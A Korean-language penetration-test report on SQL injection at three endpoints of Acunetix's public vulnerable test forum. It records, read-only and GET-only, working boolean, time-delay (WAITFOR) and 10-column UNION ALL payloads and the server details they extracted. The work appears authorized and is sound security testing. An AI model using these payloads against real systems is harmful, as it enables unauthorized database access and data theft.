# r2 — testasp.vulnweb.com SQLi 3지점 실증 결과 (읽기 전용, GET only)

harness: `probe.py` (urllib, redirect 미추적), 로그: `requests.jsonl` (총 265 요청, 전부 GET)
대상: http://testasp.vulnweb.com — Acunetix 공개 취약 테스트 포럼(own_system, 자유 테스트 허용)

## 판정 요약

| # | 지점 | 주입 | boolean 오라클 | 시간차 오라클 | 열람 방식 |
|---|---|---|---|---|---|
| 1 | GET /showforum.asp?id=N | ✅ | ✅ 200(참)/500(거짓) | ✅ 24.4s vs 0.32s | blind (UNION 불가: 2열·3열 질의 공용) |
| 2 | GET /showthread.asp?id=N | ✅ | ✅ 200(참)/500(거짓) | ✅ 8.4s vs 0.33s | blind (UNION 불가: 4열·5열 질의 공용) |
| 3 | GET /Search.asp?tfSearch=X | ✅ | ✅ 본문 행수(다수/0) | (불필요) | **UNION ALL 성립 → 응답에 그대로 렌더(1요청 추출)** |

## 1. /showforum.asp?id=N — 조건제어 + 문장제어
원본 질의(소스 확인): `SELECT name, descr FROM forums WHERE id=<id>` (2열) /
`SELECT id,title,poster FROM threads WHERE forumid=<id>` (3열) /
`SELECT COUNT(id) as pc, MAX(postdate) as lp FROM posts WHERE threadid=.. AND forumid=<id>` (2열)

- 대조군(형식 검증): `id=1` → 200/3077B · `id=0` → 200 (r0001_A_f1_base)
- boolean: `id=1 AND 1=1` → **200** (r0002) / `id=1 AND 1=2` → **500** (r0003)
  `id=2 AND 1=1` → 200 (r0004) / `id=2 AND 1=2` → 500 (r0005)  ← id 무관, 조건만이 원인
- 서브쿼리 조건: `id=1 AND (SELECT COUNT(*) FROM forums)>0` → 200 / `>100` → 500
- **blind 추출 실증**: DB_NAME() = `acuforum`, @@version[1:12] = `Microsoft SQ` (r0039~r0045, r0151~r0157; `blind_extract.txt`), `(SELECT COUNT(*) FROM users)>0`→200 / `>10000`→500 (r0250/r0251)
- 시간차(스택드): `id=0;IF 1=1 WAITFOR DELAY '0:0:04'--` → **24.38s** (r0023) /
  `IF 1=2` → **0.32s** (r0024). 동일 페이로드 데이터 오라클: `IF (SELECT DB_NAME())='acuforum'` → 12.41s vs `'bogus'` → 0.34s (r0235/0236)
- UNION 불가 실증: `id=0 UNION SELECT 'A','B'--` → 500 / `'A','B','C'--` → 500 (r0252/0253)
  ⇒ 2열 질의와 3열 질의가 같은 id 를 공유 → 어떤 열수로도 정합 불가 → blind 만 가능
- 형식 통제: `id=1'` → 500 (r0242) ⇒ 숫자 문맥(따옴표 불필요)

## 2. /showthread.asp?id=N — 동일 패턴
원본 질의: 4열(`forums a, threads b ... b.id=<id>`) / 5열(`posts a, users b ... threadid=<id> AND forumid=<ForumId>`) / POST분기 2열
- 대조군: `id=0` → 200/3031B (r0010)
- boolean: `id=0 AND 1=1` → **200** (r0011) / `id=0 AND 1=2` → **500** (r0012)
- 서브쿼리: `id=0 AND (SELECT COUNT(*) FROM forums)=3` → 200
- **blind 추출**: DB_NAME() = `acuforum` (r0095~r0101; `blind_extract.txt`)
- 시간차: `id=0;IF 1=1 WAITFOR DELAY '0:0:04'--` → **8.36s** (r0029) / `IF 1=2` → 0.33s (r0030)
  데이터 오라클: 4.38s vs 0.33s (r0237/0238)
- UNION 불가: 4열/5열 페이로드 둘 다 500 (r0254/0255)

## 3. /Search.asp?tfSearch=X — UNION 성립(값 렌더)
원본: `... WHERE a.forumid=d.id AND a.threadid=c.id AND (CHARINDEX(a.title,'<st>')>0 OR CHARINDEX(a.message,'<st>')>0)` (10열)
- boolean: `zzq')>0 OR (1=1))--` → 200, posttext 6행 (r0018) / `(1=2)` → 200, **0행** (r0019)
- **UNION ALL (10열) → 응답에 렌더**: `zzq')>0) UNION ALL SELECT 1,'ACU-M1','ACU-M2','ACU-M3',5,6,GETDATE(),'ACU-M8','ACU-M9','ACU-M10'--`
  마커 6개(posttitle/posttext/avatar/ttitle/name/poster) 전부 본문 확인 (r0020)
- 열수 통제: 9열 → 500 (r0038) / 3열 → 500 (r0021) ⇒ 10열 확정
- **추출 결과(1요청)**: `DB_NAME()=acuforum`,
  `@@version = Microsoft SQL Server 2014 (SP3-GDR) (KB5029184) - 12.0.6179.1 (X64) ... Express Edition (64-bit) on Windows NT 6.3 (Build 9600) (Hypervisor)` (r0034),
  `SYSTEM_USER=acunetix`, `SERVERPROPERTY('ProductVersion')=12.0.6179.1`, `Edition=Express Edition (64-bit)` (r0246~r0249),
  테이블 = threads, users, forums, posts (r0036),
  행수(변동값): users=84→94, posts=10→54, forums=3, threads=5→31 (r0037/r0248) ⇒ **행수 하드코딩 금지**
- UNION 불가 오판 주의: 같은 앱의 id 파라미터는 컬럼수 상이 다중 질의라 500 → "앱 전체 UNION 불가"로 일반화하면 오판(엔드포인트 단위 판정)

## 실패/한계
- 오류 응답은 커스텀 500 페이지(1208B) — SQL 오류문/스택 미노출 ⇒ 블라인드 전용.
  따라서 "조건 거짓(500)"과 "문법 오류(500)"는 상태코드만으로 구분 불가 →
  반드시 `(1=1)`/`(1=2)` 쌍과 `id=0`(정상 200) 대조군으로 구분했다.
- 1회(세션 초기) `E_suser_props` 조합 페이로드가 500 → 동일 취지 재시도(r0039) 200. 기법 한계 아님(일시 오류)로 기록.
- POST/POST 분기의 DELETE 는 미사용(GET 전용). 스택드는 `WAITFOR DELAY` 지연만 사용, 쓰기 0건.

## 요청량
총 265 요청 (Search 17 / showforum 173 / showthread 74 / Default 1). ffuf 스캔 없음.
